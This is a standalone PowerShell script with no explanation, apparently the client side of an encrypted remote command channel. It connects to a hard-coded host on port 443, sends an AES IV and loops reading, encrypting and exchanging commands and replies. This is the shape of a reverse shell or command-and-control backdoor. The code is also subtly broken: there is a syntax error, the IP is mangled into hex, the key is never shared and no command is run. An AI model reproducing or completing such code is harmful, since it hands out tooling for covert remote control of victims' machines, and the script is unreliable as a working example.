

 
Add-Type -AssemblyName System.Security.Cryptography

 
$SSSX = 0x55  0xAA 
$IP = [System.BitConverter]::ToString([byte[]]@(10, 211, 55, 5)).Replace("-", "")
$P = 443

 
$TcpClient = New-Object System.Net.Sockets.TcpClient
$TcpClient.Connect($IP, $P)
$Stream = $TcpClient.GetStream()
$Writer = New-Object System.IO.BinaryWriter($Stream)
$Reader = New-Object System.IO.StreamReader($Stream)


$Key = New-Object byte[] 32
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($Key)


$aes = New-Object System.Security.Cryptography.AesManaged
$aes.Key = $Key
$aes.GenerateIV()
$IV = $aes.IV
$Stream.Write($IV, 0, $IV.Length)


While ($true) {
    Try {
        $CMD = $Reader.ReadLine()
        If ($CMD -eq "exit") { break }
        $encryptedCMD = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::ASCII.GetBytes($CMD), 0, $CMD.Length)
        $Stream.Write($encryptedCMD, 0, $encryptedCMD.Length)
        $encryptedResp = New-Object byte[] 4096
        $bytesRead = $Stream.Read($encryptedResp, 0, $encryptedResp.Length)
        $decryptedResp = $aes.CreateDecryptor().TransformFinalBlock($encryptedResp, 0, $bytesRead)
        Write-Host [Text.Encoding]::ASCII.GetString($decryptedResp)
    } catch {
        $TcpClient.Close()
        $Stream.Close()
    }
}
